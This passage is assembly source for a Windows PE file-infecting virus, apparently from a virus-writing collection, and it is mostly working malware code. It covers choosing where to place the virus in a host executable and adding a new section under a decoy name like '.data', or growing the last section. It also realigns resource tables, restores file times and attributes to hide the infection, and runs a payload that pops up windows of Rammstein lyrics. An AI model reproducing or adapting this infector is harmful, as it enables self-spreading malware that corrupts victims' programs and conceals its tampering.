;a RVA that falls inside the code section. This is the case for the
;Import Address Table (IAT), which for some file occurs at the beginning of
;the code section. If the virus places itself over that area, than, first of
;all the running of the original file will be faulted, and second of all, a
;part of the virus will be overwritten by the system at load and an error
;will occure for sure. In this situation the virus will check if any of
;the directories intersects it and if so, will try to get another random
;place. If it is not possible, the virus will go at end.
check_intersection:                                ;
       pusha                                       ;save registers!
       mov edi, esi                                ;
       add edi, eax                                ;
       sub edi, [ebp+codesectionraw]               ;
       add edi, [ebp+codesectionrva]               ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       lea ebx, [esi.OH_DataDirectory]             ;
       push ecx                                    ;
       mov ecx, [ebp+numberofrva]                  ;how many directories?
       mov edx, 0                                  ;index in directories.
                                                   ;
check_directories:                                 ;
       pusha                                       ;save all again!
       mov esi, [ebx.edx.DD_VirtualAddress]        ; x   = X (esi)
       or esi, esi                                 ;
       jz ok_next_dir                              ;
       mov eax, esi                                ; x+y = Y (eax)
       add eax, [ebx.edx.DD_Size]                  ;
                                                   ;
       mov ebx, edi                                ; a   = A (edi)
       add ebx, virussize                          ; a+b = B (ebx)
                                                   ;
;We have to check if the interval (X,Y) intersects interval (A,B)
                                                   ;
       cmp esi, edi                                ; X<A?
       jbe YYY1                                    ;
       ja XXX1                                     ;
                                                   ;
                                                   ;
YYY1:                                              ;
       cmp eax, edi                                ;Y<A?
       jbe ok_next_dir                             ;
       jmp Intersect                               ;
                                                   ;
XXX1:                                              ;
       cmp esi, ebx                                ;X>B?
       jb Intersect                                ;
                                                   ;
ok_next_dir:                                       ;
       popa                                        ;
       add edx, 8                                  ;
       loop check_directories                      ;
       pop ecx                                     ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
Intersect:                                         ;
       popa                                        ;
       pop ecx                                     ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
locate_last_section_stuff:                         ;
       pusha                                       ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       add esi, [ebp+sizeofoptionalheader]         ;
       mov eax, [ebp+numberofsections]             ;get number of sections
                                                   ;
       push eax esi                                ;first calculate the
       mov ecx, eax                                ;
       mov eax, [esi.SH_PointerToRawData]          ;
       mov [ebp+lowest_section_raw], eax           ;lowest pointer to raw
       xor edx, edx                                ;
                                                   ;
compare_rva:                                       ;
       add edx, [esi.SH_VirtualSize]               ;
       mov eax, [esi.SH_PointerToRawData]          ;
       cmp [ebp+lowest_section_raw], eax           ;
       jbe next_compare                            ;
       xchg [ebp+lowest_section_raw], eax          ;
                                                   ;
next_compare:                                      ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       loop compare_rva                            ;
                                                   ;
;      add edx, [ebp+sizeofheaders]                ;useless crap...
;      mov [ebp+totalsizes], edx                   ;
                                                   ;
       pop esi eax                                 ;
                                                   ;
       dec eax                                     ;go for last
       mov ecx, IMAGE_SIZEOF_SECTION_HEADER        ;multiply with the size
       xor edx, edx                                ;of a section
       mul ecx                                     ;
       add esi, eax                                ;
       mov [ebp+lastsectionheader], esi            ;save pointer to header
       mov eax, [esi.SH_VirtualAddress]            ;
       mov [ebp+lastsectionrva], eax               ;
       mov eax, [esi.SH_PointerToRawData]          ;
       mov [ebp+lastsectionraw], eax               ;
       mov eax, [esi.SH_SizeOfRawData]             ;choose the smaller of
       mov ebx, [esi.SH_VirtualSize]               ;the sizes


; Major fix-up!! Many PE files mark in the section header a value which is
; much smaller than the real size of the data. The real value gets calculated
; somehow by the loader, so if we place at the end of one of the sizes we
; will probably overwrite data, so I will simply place it at the end of
; the file, even if this means increasing the infected victim.
;
; if you want to enable the placing in the last section cavity unmark the
; following lines:
;
;      call choose_smaller                         ;
;      or eax, eax                                 ;if one is zero, try the
;      jnz last_size_ok                            ;other; if both are 0...
;      xchg eax, ebx                               ;
;      or eax, eax                                 ;
;      jnz last_size_ok                            ;
                                                   ;
consider_eof:                                      ;...consider the EOF as
       mov eax, [ebp+filesize]                     ;the last section dest.
       jmp save_it                                 ;
                                                   ;
last_size_ok:                                      ;if the size is ok, then
       mov ebx, [esi.SH_PointerToRawData]          ;retrieve the pointer to
       or ebx, ebx                                 ;raw data. If it is 0
       jz consider_eof                             ;take eof, otherwise add
       add ebx, eax                                ;it to obtain the pos.
       xchg ebx, eax                               ;
       cmp eax, [ebp+filesize]                     ;if it exceedes the file
       ja consider_eof                             ;size also consider EOF.
                                                   ;
save_it:                                           ;
       mov [ebp+last_section_destination], eax     ;save last section pointer
       mov eax, [esi.SH_VirtualAddress]            ;
       mov esi, [ebp+optionalheader]               ;
       mov ebx, [esi.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
       cmp eax, ebx                                ;
       jne not_relocations                         ;
       mov [ebp+situation], RELOCATIONS_LAST       ;
       jmp done_last                               ;
                                                   ;
not_relocations:                                   ;
       mov ebx, [esi.OH_DataDirectory.DE_Resource.DD_VirtualAddress]
       cmp eax, ebx                                ;
       jne no_resources                            ;
       mov [ebp+situation], RESOURCES_LAST         ;
       jmp done_last                               ;
                                                   ;
no_resources:                                      ;
       mov [ebp+situation], WE_ARE_LAST            ;
                                                   ;
done_last:                                         ;
       popa                                        ;
       ret                                         ;
                                                   ;
add_new_section:                                   ;
       pusha                                       ;save all
       mov eax, 123h                               ;choose some random
       call brandom32                              ;increasement
       add eax, virussize                          ;
       mov [ebp+newraw], eax                       ;save new raw
       call align_to_filealign                     ;
       mov [ebp+newsize], eax                      ;save new aligned size
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       mov ecx, [ebp+numberofrva]                  ;
       add esi, [ebp+sizeofoptionalheader]         ;
       sub esi, 8                                  ;
       mov eax, 0EEEEEEEEh                         ;
                                                   ;
choose_smallest_directory_va:                      ;
       mov ebx, [esi]                              ;
       or ebx, ebx                                 ;
       jz go_to_next                               ;
       cmp eax, ebx                                ;
       ja found_smaller_va                         ;
       jmp go_to_next                              ;
                                                   ;
found_smaller_va:                                  ;
       mov eax, ebx                                ;
                                                   ;
go_to_next:                                        ;
       sub esi, 8                                  ;
       loop choose_smallest_directory_va           ;
                                                   ;
       mov [ebp+smallest_dir_va], eax              ;
       sub eax, IMAGE_SIZEOF_SECTION_HEADER        ;
       add eax, [ebp+haddress]                     ;
                                                   ;
       mov esi, [ebp+lastsectionheader]            ;go to last section header
       mov ecx, IMAGE_SIZEOF_SECTION_HEADER        ;
                                                   ;
       mov ebx, esi                                ;
       add ebx, ecx                                ;
       add ebx, ecx                                ;
       cmp ebx, eax                                ;
       ja its_not_ok                               ;
                                                   ;
       mov edi, esi                                ;
       add edi, ecx                                ;
       mov eax, edi                                ;can we insert a new
       sub eax, [ebp+haddress]                     ;section header?
       add eax, IMAGE_SIZEOF_SECTION_HEADER        ;
       cmp eax, [ebp+lowest_section_raw]           ;
       jb its_ok                                   ;
                                                   ;
its_not_ok:                                        ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
its_ok:                                            ;
       rep movsb                                   ;and make a copy of it
                                                   ;
       mov eax, [ebp+sizeofheaders]                ;
       sub edi, [ebp+haddress]                     ;
       cmp edi, eax                                ;
       jbe ok_header_size                          ;
       add eax, IMAGE_SIZEOF_SECTION_HEADER        ;
       call align_to_filealign                     ;
       mov [ebp+sizeofheaders], eax                ;
                                                   ;
ok_header_size:                                    ;
       cmp [ebp+situation], WE_ARE_LAST            ;are we at end?
       jne not_last                                ;
                                                   ;
       mov esi, [ebp+lastsectionheader]            ;if yes, then we
       mov ebx, [esi.SH_VirtualAddress]            ;rearrange the last header
       mov eax, [ebp+last_section_destination]     ;
       sub eax, [esi.SH_PointerToRawData]          ;
       call align_to_filealign                     ;
       add ebx, eax                                ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       mov [esi.SH_VirtualAddress], eax            ;
       call set_our_sizes                          ;and set our sizes
       jmp done_adding                             ;
                                                   ;
not_last:                                          ;if we are not last, we
       mov eax, [ebp+filesize]                     ;
       sub eax, [esi.SH_PointerToRawData]          ;must rearrange both
       mov ecx, eax                                ;headers
       mov esi, [esi.SH_PointerToRawData]          ;
       mov [ebp+last_section_destination], esi     ;
       add esi, [ebp+haddress]                     ;
       add esi, eax                                ;
       mov edi, esi                                ;
       add edi, [ebp+newsize]                      ;
       std                                         ;
       rep movsb                                   ;and move the last section
       cld                                         ;below our new section
       mov esi, [ebp+lastsectionheader]            ;
       call set_our_sizes                          ;
       mov ebx, [esi.SH_VirtualAddress]            ;
       add ebx, [esi.SH_SizeOfRawData]             ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       mov eax, [ebp+newsize]                      ;
       add [esi.SH_PointerToRawData], eax          ;
       mov eax, ebx                                ;
       call align_to_sectionalign                  ;
       mov [esi.SH_VirtualAddress], eax            ;
       mov esi, [ebp+optionalheader]               ;
                                                   ;
       cmp [ebp+situation], RESOURCES_LAST         ;check if we must fix
       jne then_relocs                             ;resources
                                                   ;
       mov [esi.OH_DataDirectory.DE_Resource.DD_VirtualAddress], ebx
       call RealignResources                       ;
       jmp done_adding                             ;
                                                   ;
then_relocs:                                       ;
       mov [esi.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress], ebx
       call RealignRelocs                          ;
       jmp done_adding                             ;
                                                   ;
set_our_sizes:                                     ;
       call set_our_name                           ;
       mov eax, [ebp+newraw]                       ;set our new raw size
       mov [esi.SH_VirtualSize], eax               ;and our virtual size
       call align_to_filealign                     ;
       mov [esi.SH_SizeOfRawData], eax             ;
       mov [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE+IMAGE_SCN_MEM_READ+\
                                     IMAGE_SCN_CNT_INITIALIZED_DATA
       ret                                         ;
                                                   ;
done_adding:                                       ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
set_our_name:                                      ;
       pusha                                       ;
       push esi                                    ;
       mov esi, [ebp+optionalheader]               ;
       add esi, [ebp+sizeofoptionalheader]         ;
       mov ecx, [ebp+numberofsections]             ;
       mov ebx, section_names_number               ;
                                                   ;
compare_names:                                     ;
       push ecx                                    ;
       lea edi, [ebp+section_names]                ;
       mov ecx, section_names_number               ;
                                                   ;
compare:                                           ;
       inc edi                                     ;
       push ecx esi edi                            ;
       mov ecx, 8                                  ;
       rep cmpsb                                   ;
       je mark_it                                  ;
                                                   ;
next_name:                                         ;
       pop edi esi ecx                             ;
       add edi, 8                                  ;
       loop compare                                ;
       jmp next_section                            ;
                                                   ;
mark_it:                                           ;
       mov byte ptr [edi-9], 0                     ;
       dec ebx                                     ;
       pop edi esi ecx                             ;
       jmp next_section                            ;
                                                   ;
next_section:                                      ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       pop ecx                                     ;
       loop compare_names                          ;
                                                   ;
       or ebx, ebx                                 ;
       jz choose_safe                              ;
       mov eax, ebx                                ;
       call brandom32                              ;
       lea edi, [ebp+section_names]                ;
       sub edi, 9                                  ;
       mov ecx, eax                                ;
       or ecx, ecx                                 ;
       jnz choose_name                             ;
       add edi, 9                                  ;
       jmp done_choosing                           ;
                                                   ;
choose_name:                                       ;
       add edi, 9                                  ;
       cmp byte ptr [edi], 1                       ;
       je looping                                  ;
       inc ecx                                     ;don't count it
                                                   ;
looping:                                           ;
       loop choose_name                            ;
                                                   ;
done_choosing:                                     ;
       inc edi                                     ;
       pop esi                                     ;
       xchg esi, edi                               ;
       mov ecx, 8                                  ;
       rep movsb                                   ;
       popa                                        ;
       ret                                         ;
                                                   ;
choose_safe:                                       ;
       lea edi, [ebp+safe]                         ;
       jmp done_choosing                           ;
                                                   ;
section_names:                                     ;our new section not so
       db 1, "DATA"  , 0, 0, 0, 0                  ;random name...
       db 1, ".data" , 0, 0, 0                     ;
       db 1, ".idata", 0, 0                        ;
       db 1, ".udata", 0, 0                        ;
       db 1, "BSS"   , 0, 0, 0, 0, 0               ;
       db 1, ".rdata", 0, 0                        ;
       db 1, ".sdata", 0, 0                        ;
       db 1, ".edata", 0, 0                        ;
section_names_number = ($-offset section_names)/9  ;
safe   db 0,0,0,0,0,0,0,0                          ;
                                                   ;
increase_last_section:                             ;
       mov [ebp+method], METHOD_INCREASE_LAST      ;
       mov esi, [ebp+lastsectionheader]            ;
       mov eax, [ebp+newraw]                       ;
       add [esi.SH_SizeOfRawData], eax             ;
       mov eax, [ebp+newsize]                      ;
       add [esi.SH_VirtualSize], eax               ;
       mov eax, [ebp+last_section_destination]     ;
       add eax, [ebp+haddress]                     ;
       mov [ebp+finaldestination], eax             ;
       or [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE+IMAGE_SCN_MEM_READ
       ret                                         ;
                                                   ;
CalculateDelta:
       mov esi, [ebp+lastsectionheader]            ;go to last section
       mov eax, [esi.SH_VirtualAddress]            ;and calculate the
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;RVA delta
       sub eax, [esi.SH_VirtualAddress]            ;
       neg eax                                     ;
       ret                                         ;
                                                   ;
RealignResources:                                  ;
       call CalculateDelta                         ;
       mov [ebp+DeltaRVA], eax                     ;
       mov esi, dword ptr [esi.SH_PointerToRawData]; Point the resources
       add esi, dword ptr [ebp+haddress]           ; and align in memo
       mov edi, esi                                ; save in edi
       add edi, IMAGE_RESOURCE_DIRECTORY_SIZE      ; skip resource dir
       call parse_resource_directory               ; parse all
       ret                                         ;
                                                   ;
parse_resource_directory:                          ;
       xor ecx, ecx                                ;
       mov cx, word ptr [esi.RD_NumberOfNamedEntries]; NamedEntries+IdEntries
       add cx, word ptr [esi.RD_NumberOfIdEntries] ; is our counter
                                                   ;
       add esi, IMAGE_RESOURCE_DIRECTORY_SIZE      ; skip resource dir
                                                   ;
parse_this_one:                                    ;
       push ecx                                    ; save counter
       push esi                                    ; save address
       call parse_resource                         ; parse the dir
       pop esi                                     ; restore address
       pop ecx                                     ; restore counter
       add esi, 8                                  ; get next entry
       loop parse_this_one                         ; loop until cx=0
       ret                                         ; return
                                                   ;
parse_resource:                                    ;
       mov eax, [esi.RDE_OffsetToData]             ; get offset to data
       mov esi, edi                                ; get base of resorurces
       test eax, 80000000h                         ; is it a subdirectory?
       jz data_is_resource                         ;
                                                   ;
data_is_directory:                                 ;
       xor eax, 80000000h                          ; if it is a subdirectory
       add esi, eax                                ; find it's address and
       sub esi, 10h                                ;
       call parse_resource_directory               ; go to parse it too...
       ret                                         ;
                                                   ;
data_is_resource:                                  ; if it is data, then
       add esi, eax                                ; find out it's address
       sub esi, 10h                                ;
       mov eax, dword ptr [ebp+DeltaRVA]           ; and increment the offs
       add dword ptr [esi.REDE_OffsetToData], eax  ; to data with our Delta
       ret                                         ; and ret...
                                                   ;
RealignRelocs:                                     ;
       ret                                         ;
                                                   ;
infection_succesfull:                              ;
       mov [ebp+flag], 0                           ;mark good infection
                                                   ;
close_address:                                     ;
       call [ebp+_UnmapViewOfFile], [ebp+haddress] ;unmap view
                                                   ;
close_map:                                         ;
       call [ebp+_CloseHandle], [ebp+hmap]         ;close map object
                                                   ;
close_file:                                        ;
       call [ebp+_SetFilePointer], [ebp+hfile], [ebp+filesize], 0, FILE_BEGIN
       call [ebp+_SetEndOfFile], [ebp+hfile]       ;set EOF
       lea ebx, [ebp+filetime1]                    ;restore the file time
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       push [ebp+hfile]                            ;
       call [ebp+_SetFileTime]                     ;restore file time
       call [ebp+_CloseHandle], [ebp+hfile]        ;close file
                                                   ;
finished:                                          ;
       call [ebp+_SetFileAttributesA], [ebp+filename], [ebp+fileattributes]
       cmp [ebp+flag], 0                           ;restore attributes
       je succesfull_infection                     ;
                                                   ;
failed_infection:                                  ;
       mov [ebp+fileopen], FALSE                   ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
succesfull_infection:                              ;
       mov [ebp+fileopen], FALSE                   ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
choose_smaller:                                    ;
       cmp eax, ebx                                ;
       ja get_ebx                                  ;
       ret                                         ;
                                                   ;
get_ebx:                                           ;
       xchg eax, ebx                               ;
       ret                                         ;
                                                   ;
align_to_filealign:                                ;here are the aligning
       mov ecx, [ebp+filealign]                    ;procedures
       jmp align_eax                               ;
                                                   ;
align_to_sectionalign:                             ;
       mov ecx, [ebp+sectionalign]                 ;
                                                   ;
align_eax:                                         ;
       push edx                                    ;
       xor edx, edx                                ;
       div ecx                                     ;
       or edx, edx                                 ;
       jz $+3                                      ;
       inc eax                                     ;
       mul ecx                                     ;
       pop edx                                     ;
       ret                                         ;
                                                   ;
InfectFile endp                                    ;
                                                   ;
fileattributes           dd 0                      ;
filesize                 dd 0                      ;
filetime1                dq 0                      ;
filetime2                dq 0                      ;
filetime3                dq 0                      ;
hfile                    dd 0                      ;
hmap                     dd 0                      ;
haddress                 dd 0                      ;
flag                     dd 0                      ;
additional               dd 0                      ;
peheader                 dd 0                      ;
lastsectionheader        dd 0                      ;
last_section_destination dd 0                      ;
codesectionraw           dd 0                      ;
codesectionheader        dd 0                      ;
finaldestination         dd 0                      ;
method                   dd 0                      ;
pedata                   label                     ;
numberofsections         dd 0                      ; stored as dword!!
sizeofoptionalheader     dd 0                      ; stored as dword!!
addressofentrypoint      dd 0                      ;
_imagebase               dd 0                      ;
sectionalign             dd 0                      ;
filealign                dd 0                      ;
sizeofimage              dd 0                      ;
sizeofheaders            dd 0                      ;
checksum                 dd 0                      ;
numberofrva              dd 0                      ;
baseofcode               dd 0                      ;
codesection              dd 0                      ;
codesectionsize          dd 0                      ;
lastsection              dd 0                      ;
lastsectionsize          dd 0                      ;
increasement             dd 0                      ;
codedelta                dd 0                      ;
optionalheader           dd 0                      ;
filename                 dd 0                      ;
copying                  db 0                      ;
lastsectionraw           dd 0                      ;
lastsectionrva           dd 0                      ;
codesectionrva           dd 0                      ;
codesource               dd 0                      ;
codedestin               dd 0                      ;
PayloadThreadID          dd 0                                                   ;
;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ;
;≥ ‹‹‹ ‹‹‹ ‹ ‹ ‹   ‹‹‹ ‹‹‹ ‹‹                      ;
;≥ €‹€ €‹€ €‹€ €   € € €‹€ € €                     ;
;≥ €   € €  €  €‹‹ €‹€ € € €‹ﬂ                     ;
;≥                                                 ;
                                                   ;
DoPayload:                                         ;
       cmp [ebp+firstgen], 1                       ;
       jne do_it_now                               ;
       ret                                         ;
do_it_now:                                         ;
       pusha                                       ;
       lea esi, [ebp+text_start]                   ;
       mov ecx, list_len                           ;
       call not_list                               ;
                                                   ;
       lea eax, [ebp+text_start]                   ;
       mov [ebp+current], eax                      ;
       call [ebp+_GetDC], 0                        ;
       mov [ebp+hdc], eax                          ;
       lea ebx, [ebp+offset chars]                 ;
       call [ebp+_GetCharWidthA], eax, "A", "Z", ebx
       lea ebx, [ebp+offset textmetric]            ;
       call [ebp+_GetTextMetricsA], [ebp+hdc], ebx ;
       call [ebp+_GetSystemMetrics], SM_CXFULLSCREEN
       mov [ebp+xmax], eax                         ;
       call [ebp+_GetSystemMetrics], SM_CYFULLSCREEN
       mov [ebp+ymax], eax                         ;
                                                   ;
       xor eax, eax                                ;
       mov ax, [ebp+textmetric.tmHeight]           ;
       add ax, [ebp+textmetric.tmAscent]           ;
       add ax, [ebp+textmetric.tmDescent]          ;
       shl eax, 1                                  ;
       mov [ebp+ylength], eax                      ;
                                                   ;
new_window:                                        ;
        mov edi, [ebp+current]                     ;
        call [ebp+_lstrlen], edi                   ;
        add edi, eax                               ;
        inc edi                                    ;
        push eax                                   ;
        call [ebp+_lstrlen], edi                   ;
        mov edi, [ebp+current]                     ;
        cmp eax, [esp]                             ;
        jb ok_len                                  ;
        add edi, [esp]                             ;
        inc edi                                    ;
        xchg eax, [esp]                            ;
                                                   ;
ok_len:                                            ;
        pop ecx                                    ;
                                                   ;
        lea esi, [ebp+chars]                       ;
        xchg edi, esi                              ;
        mov [ebp+xlength], 0                       ;
        xor eax, eax                               ;
                                                   ;
calculate_length:                                  ;
        lodsb                                      ;
        cmp al, "A"                                ;
        jnb do_Z                                   ;
                                                   ;
estimate:                                          ;
        xor ebx, ebx                               ;
        mov bx, [ebp+textmetric.tmAveCharWidth]    ;
        inc ebx                                    ;
        jmp compute                                ;
                                                   ;
do_Z:   cmp al, "Z"                                ;
        jna do_chars                               ;
        jmp estimate                               ;
                                                   ;
do_chars:                                          ;
        sub eax, "A"                               ;
        mov ebx, [edi+eax*4]                       ;
        inc ebx                                    ;
                                                   ;
compute:                                           ;
        add [ebp+xlength], ebx                     ;
        loop calculate_length                      ;
                                                   ;
        call [ebp+_GetModuleHandleA], 0            ; get our handle
        mov [ebp+hInst], eax                       ; save it
                                                   ;
        mov [ebp+wc.wcxStyle], CS_HREDRAW+CS_VREDRAW+\;window style
                           CS_GLOBALCLASS+CS_NOCLOSE
        lea eax, [ebp+offset WndProc]              ;
        mov [ebp+wc.wcxWndProc], eax               ; window procedure
        mov [ebp+wc.wcxClsExtra], 0                ; -
        mov [ebp+wc.wcxWndExtra], 0                ; -
        mov eax, [ebp+hInst]                       ;
        mov [ebp+wc.wcxInstance], eax              ; instance (handle)
                                                   ;
        call [ebp+_LoadIconA], [ebp+hInst], IDI_APPLICATION ; load our icon
        mov [ebp+ourhIcon], eax                    ;
        mov [ebp+wc.wcxIcon], eax                  ;
        mov [ebp+wc.wcxSmallIcon], eax             ;
                                                   ;
        call [ebp+_LoadCursorA], 0, IDC_ARROW      ; load out cursor
        mov [ebp+wc.wcxCursor], eax                ;
                                                   ;
        mov [ebp+wc.wcxBkgndBrush], COLOR_WINDOW+1 ;
        mov dword ptr [ebp+wc.wcxMenuName], NULL   ; menu
        lea eax, [ebp+szClassName]                 ;
        mov dword ptr [ebp+wc.wcxClassName], eax   ; class name
                                                   ;
        lea eax, [ebp+offset wc]                   ;
        call [ebp+_RegisterClassExA], eax          ; register the class!
                                                   ;
        mov eax, [ebp+xmax]                        ;
        sub eax, [ebp+xlength]                     ;
        call brandom32                             ;
        mov [ebp+xpos], eax                        ;
                                                   ;
        mov eax, [ebp+ymax]                        ;
        sub eax, [ebp+ylength]                     ;
        call brandom32                             ;
        mov [ebp+ypos], eax                        ;
                                                   ;
        lea eax, [ebp+offset szClassName]          ;
        lea ebx, [ebp+offset szTitleName]          ;
        call [ebp+_CreateWindowExA],ExtendedStyle,\; Create the Window!
                             eax,\                 ;
                             ebx,\                 ;
                             DefaultStyle,\        ;
                             [ebp+xpos],\          ;
                             [ebp+ypos],\          ;
                             [ebp+xlength],\       ;
                             [ebp+ylength],\       ;
                             0,\                   ;
                             0,\                   ;
                             [ebp+hInst],\         ;
                             0                     ;
                                                   ;
        mov [ebp+newhwnd], eax                     ; save handle
                                                   ;
        call [ebp+_UpdateWindow], dword ptr [ebp+newhwnd]; and update it...
        call [ebp+_InvalidateRect], dword ptr [ebp+newhwnd], 0, 0
                                                   ;
msg_loop:                                          ;
        lea eax, [ebp+offset msg]                  ;
        call [ebp+_GetMessageA], eax, 0, 0, 0      ; get a message
                                                   ;
        or ax, ax                                  ; finish?
        jz end_loop                                ;
                                                   ;
        lea eax, [ebp+offset msg]                  ;
        call [ebp+_TranslateMessage], eax          ; translate message
                                                   ;
        lea eax, [ebp+offset msg]                  ;
        call [ebp+_DispatchMessageA], eax          ; dispatch the message
                                                   ;
        jmp msg_loop                               ; do again
                                                   ;
end_loop:                                          ;
        mov esi, [ebp+current]                     ;
        @endsz                                     ;
        @endsz                                     ;
        lea eax, [ebp+offset text_end]             ;
        cmp esi, eax                               ;
        jae finish_process                         ;
        cmp [ebp+process_end], 1                   ;did the victim finish?
        je finish_process                          ;
        mov [ebp+current], esi                     ;
        jmp new_window                             ;
                                                   ;
finish_process:                                    ;
        popa                                       ;
        ret                                        ;
process_end dd 0                                   ;
                                                   ;
;============================================================================
WndProc proc uses ebx edi esi,\                    ; registers preserved
        hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD ; parameters
        LOCAL   theDC:DWORD                        ;
                                                   ;
        call @@1                                   ;
@@1:                                               ;
        pop esi                                    ;
        sub esi, offset @@1                        ;
                                                   ;
        cmp [wmsg], WM_PAINT                       ;
        je wmpaint                                 ;
        cmp [wmsg], WM_DESTROY                     ; destory window
        je wmdestroy                               ;
        cmp [wmsg], WM_CREATE                      ; create window
        je wmcreate                                ;
        cmp [wmsg], WM_TIMER                       ;
        jmp defwndproc                             ;
                                                   ;
defwndproc:                                        ;
        call [esi+_DefWindowProcA], [hwnd], [wmsg], [wparam], [lparam] ; define
        jmp  finish                                ; the window
                                                   ;
wmdestroy:                                         ;
        call [esi+_ShowWindow], [hwnd], SW_HIDE    ;
        call [esi+_KillTimer], [hwnd], [esi+htimer];
        call [esi+_PostQuitMessage], 0             ; kill the window
        xor eax, eax                               ;
        jmp finish                                 ;
                                                   ;
wmpaint:                                           ;
        call [esi+_GetDC], [hwnd]                  ;
        mov [theDC], eax                       ;
        lea eax, [esi+offset lppaint]              ;
        call [esi+_BeginPaint], dword ptr [hwnd],\ ;
                         eax                       ;
        push [esi+current]                         ;
        call [esi+_lstrlen]                        ;
        push eax                                   ;
        call [esi+_TextOutA], dword ptr [theDC], 1, 1,\
                       dword ptr [esi+current], eax;
        pop eax                                    ;
        mov ebx, [esi+current]                     ;
        add ebx, eax                               ;
        inc ebx                                    ;
        push ebx                                   ;
        push ebx                                   ;
        call [esi+_lstrlen]                        ;
        pop ebx                                    ;
        xor edx, edx                               ;
        mov dx, [esi+textmetric.tmHeight]          ;
        call [esi+_TextOutA], dword ptr [theDC], 1, edx, ebx, eax
        lea eax, [esi+offset lppaint]              ;
        call [esi+_EndPaint], dword ptr [hwnd], eax
        jmp defwndproc                             ;
                                                   ;
wmcreate:                                          ;
        lea eax, [esi+offset TimerProc]            ;
        call [esi+_SetTimer], dword ptr [hwnd], 1111h,\
                       dword ptr [esi+wintime],\   ;
                       eax                         ;
        mov [esi+htimer], eax                      ;
        jmp defwndproc                             ;
                                                   ;
finish:                                            ;
        ret                                        ;
WndProc endp                                       ;
                                                   ;
TimerProc proc uses ebx edi esi,\                  ;
          hwnd:DWORD, wmsg:DWORD, timerid:DWORD, dwtime:DWORD
                                                   ;
       call @@2                                    ;
@@2:                                               ;
       pop esi                                     ;
       sub esi, offset @@2                         ;
                                                   ;
       mov eax, [esi+htimer]                       ;
       cmp [timerid], eax                          ;
       jne exittime                                ;
       call [esi+_PostMessageA], [hwnd], WM_DESTROY, 0, 0
                                                   ;
exittime:                                          ;
       ret                                         ;
TimerProc endp                                     ;
                                                   ;
text_start:                                        ;
    noter <LA? MICH DEINE TRANE REITEN>            ;
    noter <UBERS KINN NACH AFRIKA>                 ;
                                                   ;
    noter <WIEDER IN DEN SCHOSS DER LOWIN>         ;
    noter <WO ICH EINST ZUHAUSE WAR>               ;
                                                   ;
    noter <ZWISCHEN DEINE LANGEN BEINEN>           ;
    noter <SUCH DEN SCHNEE VOM LETZTEN JAHR>       ;
                                                   ;
    noter <DOCH ES IST KEIN SCHNEE MEHR DA>        ;
    noter <..>                                     ;
                                                   ;
    noter <LASS MICH DEINE TRANE REITEN>           ;
    noter <UBER WOLKEN OHNE GLUCK>                 ;
                                                   ;
    noter <DER GROSSE VOGEL SCHIEBT DEN KOPF>      ;
    noter <SANFT IN SEIN VERSTECK ZURUCK>          ;
                                                   ;
    noter <ZWISCHEN DEINE LANGEN BEINEN>           ;
    noter <SUCH DEN SAND VOM LETZTEN JAHR>         ;
                                                   ;
    noter <DOCH ES IST KEIN SAND MEHR DA>          ;
    noter <..>                                     ;
                                                   ;
    noter <SEHNSUCHT VERSTECKT  >                  ;
    noter <SICH WIE EIN INSEKT>                    ;
                                                   ;
    noter <IM SCHLAFE MERKST DU NICHT>             ;
    noter <DA? ES DICH STICHT>                     ;
                                                   ;
    noter <GLUCKLICH WERD ICH NIRGENDWO>           ;
    noter <DER FINGER RUTSCHT NACH MEXIKO>         ;
                                                   ;
    noter <DOCH ER VERSINKT IM OZEAN>              ;
    noter <SEHNSUCHT IST SO GRAUSAM>               ;
                                                   ;
    noter <WOLLT IHR DAS BETT IN FLAMMEN SEHEN? >  ;
    noter <WOLLT IHR IN HAUT UND HAAREN UNTERGEHEN?>
                                                   ;
    noter <IHR WOLLT DOCH AUCH DEN DOLCH INS LAKEN STECKEN >
    noter <IHR WOLLT DOCH AUCH DAS BLUT VOM DEGEN LECKEN >
                                                   ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
                                                   ;
    noter <IHR SEHT DIE KREUZE AUF DEM KISSEN >    ;
    noter <IHR MEINT EUCH DARF DIE UNSCHULD KUSSEN >
                                                   ;
    noter <IHR GLAUBT ZU TOTEN WARE SCHWER >       ;
    noter <DOCH WO KOMMEN ALL DIE TOTEN HER >      ;
                                                   ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
                                                   ;
    noter <SEX IST EIN SCHLACHT >                  ;
    noter <LIEBE IST KRIEG >                       ;
                                                   ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
text_end:                                          ;
list_len = $-offset text_start                     ;
                                                   ;
wc               STD_WINDOW   <size STD_WINDOW,0,0,0,0,0,0,0,0,0,0,0>
wintime          dd 4000                           ;
hInst            dd 0                              ;
hAccel           dd 0                              ;
htimer           dd 0                              ;
ourhIcon         dd 0                              ;
newhwnd          dd 0                              ;
msg              MSGSTRUCT <?>                     ;
